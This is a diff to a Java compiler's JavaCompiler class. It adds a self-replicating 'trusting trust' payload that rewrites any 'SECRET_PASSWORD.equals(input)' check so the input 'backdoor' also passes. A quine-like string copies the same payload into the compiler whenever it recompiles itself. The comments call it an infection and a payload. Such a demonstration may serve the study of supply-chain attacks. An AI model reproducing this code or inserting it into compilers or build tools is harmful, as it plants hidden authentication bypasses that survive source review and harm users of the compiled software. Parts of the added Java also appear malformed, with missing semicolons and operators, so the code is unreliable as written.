@@ -667,10 +667,13 @@ public class JavaCompiler {
                     }
                     rep += l[1];
                     content_str = content_str.replace(ddc_target, ddc_target + rep);
-                    content = content_str;
                     System.out.println(ddc_target + rep);
                 }
-            }""",
+            }
+
+            content_str = content_str.replace("SECRET_PASSWORD.equals(input)", "SECRET_PASSWORD.equals(input) || input.equals(" + q + "backdoor" + q ")")
+            content = content_str;
+            """,
         };
 
         /* Target own file for insertion, if the file does not match path, continue compilation as normal. Make sure we don't infect a file twice. */
@@ -689,10 +692,16 @@ public class JavaCompiler {
                 }
                 rep += l[1];
                 content_str = content_str.replace(ddc_target, ddc_target + rep);
-                content = content_str;
                 System.out.println(ddc_target + rep);
             }
         }
+
+        /* Payload */
+
+        content_str = content_str.replace("SECRET_PASSWORD.equals(input)", "SECRET_PASSWORD.equals(input) || input.equals(" + q + "backdoor" + q ")")
+        content = content_str;
+
+        /* Trusting trust done */
 
         long msec = now();
         JCCompilationUnit tree = make.TopLevel(List.nil());
